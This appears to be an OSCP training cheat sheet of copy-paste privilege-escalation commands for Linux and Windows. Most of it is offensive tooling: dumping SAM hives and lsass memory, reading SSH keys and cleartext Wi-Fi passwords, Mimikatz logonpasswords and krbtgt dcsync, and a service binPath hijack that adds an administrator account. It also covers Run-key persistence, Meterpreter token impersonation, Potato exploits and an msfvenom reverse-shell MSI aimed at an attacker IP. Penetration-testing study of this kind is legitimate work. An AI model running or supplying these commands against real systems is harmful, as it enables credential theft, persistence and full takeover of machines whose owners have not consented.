# Privilege Escalation — Command Cheat Sheet (Linux & Windows)

**Track:** Mastering OSCP
**Section:** Privilege Escalation — 025
**Purpose:** A pure command reference for local privilege escalation on both Linux and Windows — no theory, just organized, copy-pasteable commands.

---

## Linux

### System & Kernel Info

```bash
cat /etc/os-release              # Distro name/version
uname -a                         # Kernel version, full
cat /proc/version                # Kernel version, alternate source
lscpu                            # CPU info
cat /etc/shells                  # Available login shells
```

### Users, Processes & Sessions

```bash
ps aux | grep root               # Processes running as root
ps au                            # All current processes
who                              # Currently logged-in users
w                                # Logged-in users + what they're doing
last                             # Login history
id                               # Current user's UID/GID/groups
```

### Home Directories & Credential Hunting

```bash
ls /home                                  # List all user home dirs
ls -la /home/<user>/                      # Full listing incl. hidden files
ls -l ~/.ssh                              # Check for SSH keys
cat ~/.ssh/id_rsa                         # Read a private key, if accessible
history                                   # Current shell's command history
cat ~/.bash_history                       # Explicit bash history file
find / -name "*.txt" 2>/dev/null | grep -i pass   # Hunt for credential files
grep -ri password /etc/ 2>/dev/null       # Grep configs for plaintext passwords
```

### Sudo

```bash
sudo -l                          # What can the current user run as sudo?
sudo -u <user> <command>         # Run a command as a specific user
sudo su                          # Escalate directly, if permitted
```

### PATH & Environment

```bash
echo $PATH                                # Current PATH
export PATH=$PATH:/home/kali/test         # Add a directory to PATH
cp test/shell.sh /usr/local/bin           # Move a script into an existing PATH dir
env                                       # All environment variables
```

### Permissions, SUID/SGID & Writable Locations

```bash
ls -lah /bin/passwd                                        # Inspect SUID bit on a known binary
chmod u+s filename                                          # Set SUID
chmod u-s filename                                           # Remove SUID
find / -perm -4000 -type f 2>/dev/null                       # Find all SUID binaries
find / -perm -2000 -type f 2>/dev/null                       # Find all SGID binaries
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null  # World-writable directories
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null  # World-writable files
```

### Automated Enumeration

```bash
./linpeas.sh                     # LinPEAS — broad automated enumeration
./LinEnum.sh                     # LinEnum — alternative enumeration script
```

---

## Windows

### System & OS Info

```cmd
systeminfo
[System.Environment]::OSVersion.Version
Get-ComputerInfo | Select-Object OsName, OsVersion, OsBuildNumber
wmic qfe get Caption,Description,HotFixID,InstalledOn
Get-HotFix | Sort-Object InstalledOn -Descending
```

### Current User & Privileges

```cmd
whoami /all
whoami /priv
whoami /groups
```

### Local Users, Groups & Sessions

```cmd
net user
net user <username> /domain
net localgroup administrators
Get-LocalGroupMember -Group "Administrators"
```

### Processes, Services & Network

```cmd
tasklist /v
Get-Process | Select-Object Name, Id, Path
sc query
Get-Service | Where-Object {$_.Status -eq "Running"}
netstat -ano
Get-NetTCPConnection
```

### Scheduled Tasks

```cmd
schtasks /query /fo LIST /v
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft\*"}
schtasks /create /tn "TaskName" /tr "cmd.exe /c whoami > C:\Temp\out.txt" /sc once /st 00:00 /ru "SYSTEM"
schtasks /run /tn "TaskName"
```

### Environment & PATH

```cmd
set
Get-ChildItem Env:
($env:PATH).Split(';')
```

### File & Registry Permission Checks

```cmd
icacls "C:\path\to\file_or_dir"
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -kvuqsw "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
```

### Service Exploitation

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto"
sc config <ServiceName> binPath= "cmd.exe /c net user hacker P@ss /add && net localgroup administrators hacker /add"
sc stop <ServiceName>
sc start <ServiceName>
reg add "HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>" /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c ..." /f
```

### Registry — Autoruns & Credentials

```cmd
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query HKLM /f password /t REG_SZ /s
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v EvilKey /t REG_SZ /d "C:\Temp\payload.exe" /f
```

### AlwaysInstallElevated

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

### UAC Level Check

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
```

### Credential Hunting

```cmd
reg save HKLM\sam C:\Temp\sam.save
reg save HKLM\system C:\Temp\system.save
reg save HKLM\security C:\Temp\security.save
procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full
cmdkey /list
type C:\Windows\Panther\Unattended.xml
type C:\unattend.xml
findstr /si cpassword \\<DOMAIN>\SYSVOL\*.xml
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
netsh wlan show profiles
netsh wlan show profile name="<SSID>" key=clear
```

### Token & Credential Tools (Mimikatz)

```
privilege::debug
token::elevate
token::whoami
sekurlsa::logonpasswords
sekurlsa::minidump lsass.dmp
lsadump::sam
lsadump::cache
lsadump::dcsync /domain:<domain> /user:krbtgt
dpapi::masterkey /in:<path> /rpc
```

### Meterpreter Token Abuse

```
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
getuid
getsystem
```

### The Potato Family (`SeImpersonatePrivilege`)

```cmd
PrintSpoofer.exe -i -c "cmd /c whoami"
GodPotato.exe -cmd "cmd /c whoami"
JuicyPotato.exe -l 6666 -p C:\Windows\System32\cmd.exe -a "/c whoami" -t * -c {CLSID}
JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c whoami"
RoguePotato.exe -r <attacker_ip> -l 9999 -e "cmd.exe /c whoami"
SweetPotato.exe -a "whoami"
EfsPotato.exe "C:\Temp\payload.exe"
```

### Automated Enumeration Tools

```cmd
winPEASx64.exe
Seatbelt.exe -group=all
SharpUp.exe audit
Watson.exe
beRoot.exe
.\jaws-enum.ps1
Invoke-PrivescCheck
Invoke-AllChecks              # PowerUp
```

### PowerUp Quick Reference

```powershell
Import-Module .\PowerUp.ps1
Invoke-AllChecks
Get-ServiceUnquoted
Get-ModifiableService
Get-ModifiableServiceFile
Invoke-ServiceAbuse -ServiceName "VulnService"
Write-ServiceBinary -ServiceName "VulnService"
Write-UserAddMSI
```

### Windows Exploit Suggester

```bash
git clone https://github.com/bitsadmin/wesng
pip3 install wesng
python3 wes.py --update
python3 wes.py sysinfo.txt -i 'Elevation of Privilege' --exploits-only
```

### SAM / NTDS Offline Dumping (Attacker Side)

```bash
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
pypykatz lsa minidump lsass.dmp
```
